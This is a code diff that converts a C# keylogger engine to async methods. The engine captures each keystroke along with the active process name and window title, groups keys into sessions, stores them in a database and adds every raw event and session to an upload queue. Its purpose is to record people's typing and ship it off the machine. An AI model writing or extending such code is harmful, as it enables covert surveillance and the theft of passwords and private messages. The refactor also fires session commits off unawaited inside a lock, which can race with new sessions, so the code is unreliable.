@@ -3,20 +3,19 @@ using Common.Helpers;
 using Common.Interfaces;
 using Common.Models;
 using KeyLogger.Interfaces;
+using Newtonsoft.Json;
 using System;
 using System.Collections.Concurrent;
 using System.Runtime.InteropServices;
-using System.Windows.Forms;
+using System.Threading.Tasks;
 using System.Timers;
-using Timer = System.Timers.Timer;
-using System.IO;
-using Newtonsoft.Json;
+using System.Windows.Forms;
 
 public class KeyLoggerEngine : IKeyLoggerEngine
 {
     private KeySessions currentSession = null;
     private readonly ConcurrentQueue<string> keyQueue = new ConcurrentQueue<string>();
-    private readonly Timer idleTimer;
+    private System.Timers.Timer idleTimer;
     private readonly int idleSeconds;
     private readonly bool isRawEnabled;
     private readonly ILogger logger;
@@ -34,14 +33,17 @@ public class KeyLoggerEngine : IKeyLoggerEngine
 
         if (!isRawEnabled)
         {
-            idleTimer = new Timer(1000);
+            idleTimer = new System.Timers.Timer(1000);
             idleTimer.Elapsed += CheckIdleTimeout;
             idleTimer.AutoReset = true;
             idleTimer.Start();
-            this.logger.LogInformation($"Idle timer started with {idleSeconds} seconds timeout.");
+
+            logger.LogInformation($"Idle timer started with {idleSeconds} seconds timeout.");
         }
+
     }
-    public void EnqueueKey(IntPtr lParam)
+
+    public async Task EnqueueKeyAsync(IntPtr lParam)
     {
         try
         {
@@ -54,7 +56,7 @@ public class KeyLoggerEngine : IKeyLoggerEngine
 
             if (isRawEnabled)
             {
-                SaveRawEvent(key, processName, windowTitle);
+                await SaveRawEventAsync(key, processName, windowTitle);
             }
             else
             {
@@ -64,36 +66,35 @@ public class KeyLoggerEngine : IKeyLoggerEngine
                 }
 
                 keyQueue.Enqueue(key);
-                ProcessKeyQueue(windowTitle, processName);
+                await ProcessKeyQueueAsync(windowTitle, processName);
             }
         }
         catch (Exception ex)
         {
-            logger.LogError($"Error in EnqueueKey: {ex.Message}");
+            logger.LogError($"Error in EnqueueKeyAsync: {ex.Message}");
         }
     }
 
-    private void ProcessKeyQueue(string windowTitle, string processName)
+    private async Task ProcessKeyQueueAsync(string windowTitle, string processName)
     {
-        lock (sessionLock)
+        await Task.Run(() =>
         {
-            while (keyQueue.TryDequeue(out string key))
+            lock (sessionLock)
             {
-                if (currentSession == null)
+                while (keyQueue.TryDequeue(out string key))
                 {
-                    StartSession(processName, windowTitle, key);
-                }
-                else if (currentSession.ProcessName != processName || currentSession.ProcessTitle != windowTitle)
-                {
-                    CommitSession();
-                    StartSession(processName, windowTitle, key);
-                }
-                else
-                {
-                    AppendKey(key);
+                    if (currentSession == null)
+                        StartSession(processName, windowTitle, key);
+                    else if (currentSession.ProcessName != processName || currentSession.ProcessTitle != windowTitle)
+                    {
+                        Task.Run(async () => await CommitSessionAsync());
+                        StartSession(processName, windowTitle, key);
+                    }
+                    else
+                        AppendKey(key);
                 }
             }
-        }
+        });
     }
 
     private void StartSession(string processName, string windowTitle, string key)
@@ -106,7 +107,6 @@ public class KeyLoggerEngine : IKeyLoggerEngine
             KeyCount = 1,
             StartTime = DateTime.Now
         };
-
         logger.LogInformation($"[SESSION START] {processName} - {windowTitle} | Key: {key}");
     }
 
@@ -124,17 +124,16 @@ public class KeyLoggerEngine : IKeyLoggerEngine
             if (currentSession != null)
             {
                 var idleTime = DateTime.Now - lastKeyTime;
-
                 if (idleTime.TotalSeconds >= idleSeconds)
                 {
                     logger.LogInformation($"Idle timeout reached after {idleTime.TotalSeconds:F1} seconds.");
-                    CommitSession();
+                    Task.Run(async () => await CommitSessionAsync());
                 }
             }
         }
     }
 
-    private void SaveRawEvent(string key, string processName, string windowTitle)
+    private async Task SaveRawEventAsync(string key, string processName, string windowTitle)
     {
         try
         {
@@ -146,7 +145,7 @@ public class KeyLoggerEngine : IKeyLoggerEngine
                 Timestamp = DateTime.Now
             };
 
-            DBContexts.Insert(ev);
+            await Task.Run(() => DBContexts.Insert(ev));
             logger.LogInformation($"[RAW] {ev.ProcessName} - {ev.ProcessTitle} | Key: {ev.KeyText}");
 
             var uploadKeyEvent = new UploadQueue
@@ -155,7 +154,8 @@ public class KeyLoggerEngine : IKeyLoggerEngine
                 PayloadJson = JsonConvert.SerializeObject(ev),
                 IsSent = false
             };
-            DBContexts.Insert(uploadKeyEvent);
+
+            await Task.Run(() => DBContexts.Insert(uploadKeyEvent));
             logger.LogInformation("KeyEvent enqueued for upload.");
         }
         catch (Exception ex)
@@ -164,7 +164,7 @@ public class KeyLoggerEngine : IKeyLoggerEngine
         }
     }
 
-    public void CommitSession()
+    public async Task CommitSessionAsync()
     {
         if (currentSession == null) return;
 
@@ -182,7 +182,7 @@ public class KeyLoggerEngine : IKeyLoggerEngine
                 EndTime = currentSession.EndTime
             };
 
-            DBContexts.Insert(eve);
+            await Task.Run(() => DBContexts.Insert(eve));
             logger.LogInformation($"[SESSION COMMIT] {currentSession.ProcessName} - {currentSession.ProcessTitle} | Total keys: {currentSession.KeyCount} | Duration: {(currentSession.EndTime - currentSession.StartTime).TotalSeconds:F1}s");
 
             var uploadSession = new UploadQueue
@@ -192,7 +192,7 @@ public class KeyLoggerEngine : IKeyLoggerEngine
                 IsSent = false
             };
 
-            DBContexts.Insert(uploadSession);
+            await Task.Run(() => DBContexts.Insert(uploadSession));
             logger.LogInformation("KeySession enqueued for upload.");
         }
         catch (Exception ex)
@@ -203,7 +203,7 @@ public class KeyLoggerEngine : IKeyLoggerEngine
         currentSession = null;
     }
 
-    public void Shutdown()
+    public async Task ShutdownAsync()
     {
         logger.LogInformation("KeyloggerEngine shutting down.");
 
@@ -213,8 +213,9 @@ public class KeyLoggerEngine : IKeyLoggerEngine
             {
                 idleTimer?.Stop();
                 idleTimer?.Dispose();
-                CommitSession();
             }
+
+            await CommitSessionAsync();
         }
     }
 }
